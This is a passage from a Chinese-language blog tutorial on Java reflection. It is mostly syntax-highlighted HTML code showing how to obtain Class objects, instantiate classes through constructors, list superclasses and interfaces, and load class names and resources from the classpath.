s.append(Modifier.toString(c.getModifiers()));</span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="comment">//            s.append(c.getName());//包名+类名</span></span><br><span class="line">            s.append(vipClass.getSimpleName());<span class="comment">//类名</span></span><br><span class="line">            s.append(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            Class[] parameterTypes = c.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; parameterTypes.length; i++)&#123;</span><br><span class="line">                s.append(parameterTypes[i].getSimpleName());</span><br><span class="line">                <span class="keyword">if</span> (i != parameterTypes.length - <span class="number">1</span> ) s.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            s.append(<span class="string">&quot;)&#123;&#125;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        s.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-1反射机制创建对象两步骤">4.1反射机制创建对象两步骤</h3><p>1.先获取到这个有参数的构造方法【用ClassgetDeclaredConstructor()方法获取】</p><p>2.调用构造方法new对象【用Constructor类的newInstance()方法new对象】</p><h4 id="4-1-1通过反射机制调用构造方法实例化java对象">4.1.1通过反射机制调用构造方法实例化java对象</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">比上一个例子(ReflectTest11)重要一些！！！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">通过反射机制调用构造方法实例化java对象。（这个不是重点）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest12</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//不适用反射创建对象</span></span><br><span class="line">        <span class="type">Vip</span> <span class="variable">vip1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vip</span>();</span><br><span class="line">        <span class="type">Vip</span> <span class="variable">vip2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vip</span>(<span class="number">123</span>, <span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;2001-10-19&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用反射机制创建对象（以前）</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">vipClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Vip&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用无参数构造方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj1</span> <span class="operator">=</span> vipClass.newInstance();<span class="comment">//Class类的newInstance方法</span></span><br><span class="line">        System.out.println(obj1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用反射机制创建对象（现在）</span></span><br><span class="line">        <span class="comment">// 调用有参数的构造方法怎么办？</span></span><br><span class="line">        <span class="comment">// 第一步：先获取到这个有参数的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">c1</span> <span class="operator">=</span> vipClass.getDeclaredConstructor(<span class="type">int</span>.class, String.class, String.class, <span class="type">boolean</span>.class);</span><br><span class="line">        <span class="comment">// 第二步：调用构造方法new对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> c1.newInstance(<span class="number">321</span>, <span class="string">&quot;lsi&quot;</span>, <span class="string">&quot;1999-10-11&quot;</span>, <span class="literal">true</span>);<span class="comment">//Constructor类的newInstance方法</span></span><br><span class="line">        System.out.println(obj2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取无参数构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">c2</span> <span class="operator">=</span> vipClass.getDeclaredConstructor();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj3</span> <span class="operator">=</span> c2.newInstance();</span><br><span class="line">        System.out.println(obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-获取一个类的父类以及实现的接口">5.获取一个类的父类以及实现的接口</h2><p>两个方法【Class类中的】</p><ol><li>public native Class&lt;? super T&gt; <strong>getSuperclass</strong>()</li><li>public Class&lt;?&gt;[] <strong>getInterfaces</strong>()</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">重点：给你一个类，怎么获取这个类的父类，已经实现了哪些接口？</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest13</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// String举例</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">vipClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取String的父类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">superclass</span> <span class="operator">=</span> vipClass.getSuperclass();</span><br><span class="line">        <span class="comment">// 获取String类实现的所有接口（一个类可以实现多个接口。）</span></span><br><span class="line">        Class[] interfaces = vipClass.getInterfaces();</span><br><span class="line">        System.out.println(superclass.getName());</span><br><span class="line">        <span class="keyword">for</span> (Class i : interfaces) &#123;</span><br><span class="line">            System.out.println(i.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javase.reflectBean.Student;</span><br><span class="line"><span class="keyword">import</span> javase.reflectBean.UserService;</span><br><span class="line"><span class="keyword">import</span> javase.reflectBean.Vip;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.util.ResourceBundle;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">要操作一个类的字节码，需要首先获取到这个类的字节码，怎么获取java.lang.Class实例？</span></span><br><span class="line"><span class="comment">    三种方式</span></span><br><span class="line"><span class="comment">        第一种：Class c = Class.forName(&quot;完整类名带包名&quot;);</span></span><br><span class="line"><span class="comment">        第二种：Class c = 对象.getClass();</span></span><br><span class="line"><span class="comment">        第三种：Class c = 任何类型.class;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        第一种方式：Class.forName()</span></span><br><span class="line"><span class="comment">            1、静态方法</span></span><br><span class="line"><span class="comment">            2、方法的参数是一个字符串。</span></span><br><span class="line"><span class="comment">            3、字符串需要的是一个完整类名。</span></span><br><span class="line"><span class="comment">            4、完整类名必须带有包名。java.lang包也不能省略。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>); <span class="comment">// c1代表String.class文件，或者说c1代表String类型。</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Integer&quot;</span>); <span class="comment">// c2代表Integer类型</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Date&quot;</span>); <span class="comment">// c3代表Date类型</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二种方式：java中任何一个对象都有一个方法：getClass()</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c4</span> <span class="operator">=</span> a.getClass(); <span class="comment">// c4代表String.class字节码文件；c4代表String类型。</span></span><br><span class="line">        System.out.println(c4 == c1);<span class="comment">//true（==判断的是对象的内存地址。）</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Date</span> <span class="variable">time</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c5</span> <span class="operator">=</span> time.getClass();</span><br><span class="line">        System.out.println(c5 == c3);<span class="comment">//true(c5和c3两个变量中保存的内存地址都是一样的，都指向方法区中的字节码文件。)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第三种方式：java语言中任何一种类型，包括基本数据类型，它都有.class属性。</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">i</span> <span class="operator">=</span> Integer.class; <span class="comment">//i代表Integer类型</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">d</span> <span class="operator">=</span> Date.class; <span class="comment">// d代表Date类型</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">f</span> <span class="operator">=</span> <span class="type">float</span>.class; <span class="comment">//f代表float类型</span></span><br><span class="line"></span><br><span class="line">        System.out.println(i == c2);<span class="comment">//true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">获取到Class，能干什么？</span></span><br><span class="line"><span class="comment">    通过Class的newInstance()方法来实例化对象。</span></span><br><span class="line"><span class="comment">    注意：newInstance()方法内部实际上调用了无参数构造方法，必须保证无参构造存在才可以。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest02</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// 下面这段代码是以反射机制的方式创建对象。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射机制，获取Class，通过Class来实例化对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.User&quot;</span>);</span><br><span class="line">        <span class="comment">// newInstance() 这个方法会调用User这个类的无参数构造方法，完成对象的创建。</span></span><br><span class="line">        <span class="comment">// 重点是：newInstance()调用的是无参构造，必须保证无参构造是存在的！</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">验证反射机制的灵活性。</span></span><br><span class="line"><span class="comment">    java代码写一遍，再不改变java源代码的基础之上，可以做到不同对象的实例化。</span></span><br><span class="line"><span class="comment">    非常之灵活。（符合OCP开闭原则：对扩展开放，对修改关闭。）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest03</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 以下代码是灵活的，代码不需要改动，可以修改配置文件，配置文件修改之后，可以创建出不同的实例对象。</span></span><br><span class="line">        <span class="comment">// 通过IO流读取reflectClassInfo.properties文件</span></span><br><span class="line">        <span class="type">FileReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;Practice/reflectClassInfo1.properties&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建属性类对象Map</span></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">pro</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();<span class="comment">// key value都是String</span></span><br><span class="line">        <span class="comment">//加载</span></span><br><span class="line">        pro.load(reader);</span><br><span class="line">        reader.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过key获取value</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> pro.getProperty(<span class="string">&quot;className&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射机制实例化对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">研究一下：Class.forName()发生了什么？</span></span><br><span class="line"><span class="comment">    记住，重点：</span></span><br><span class="line"><span class="comment">        如果你只是希望一个类的静态代码块执行，其它代码一律不执行，</span></span><br><span class="line"><span class="comment">        你可以使用：</span></span><br><span class="line"><span class="comment">            Class.forName(&quot;完整类名&quot;);</span></span><br><span class="line"><span class="comment">        这个方法的执行会导致类加载，类加载时，静态代码块执行。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">提示：</span></span><br><span class="line"><span class="comment">    后面JDBC技术的时候我们还需要。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest04</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Class.forName()这个方法的执行会导致：类加载。</span></span><br><span class="line">        Class.forName(<span class="string">&quot;javase.MyClass&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyClass中的静态代码块执行了！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">研究一下文件路径的问题。</span></span><br><span class="line"><span class="comment">怎么获取一个文件的绝对路径。以下讲解的这种方式是通用的。但前提是：文件需要在类路径下。才能用这种方式。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AboutPath</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 这种方式的路径缺点是：移植性差，在IDEA中默认的当前路径是project的根。</span></span><br><span class="line">        <span class="comment">// 这个代码假设离开了IDEA，换到了其它位置，可能当前路径就不是project的根了，这时这个路径就无效了。</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;Practice/src/reflectClassInfo2.properties&quot;</span>);</span><br><span class="line">        System.out.println(reader.exists() + <span class="string">&quot; &quot;</span> + reader.getPath());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 接下来说一种比较通用的一种路径。即使代码换位置了，这样编写仍然是通用的。</span></span><br><span class="line">        <span class="comment">// 注意：使用以下通用方式的前提是：这个文件必须在类路径下。</span></span><br><span class="line">        <span class="comment">// 什么类路径下？方式在src下的都是类路径下。【记住它】</span></span><br><span class="line">        <span class="comment">// src是类的根路径。</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        解释：</span></span><br><span class="line"><span class="comment">            Thread.currentThread() 当前线程对象</span></span><br><span class="line"><span class="comment">            getContextClassLoader() 是线程对象的方法，可以获取到当前线程的类加载器对象。</span></span><br><span class="line"><span class="comment">            getResource() 【获取资源】这是类加载器对象的方法，当前线程的类加载器默认从类的根路径下加载资源。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().getResource(<span class="string">&quot;reflectClassInfo2.properties&quot;</span>).getPath();</span><br><span class="line">        <span class="comment">// 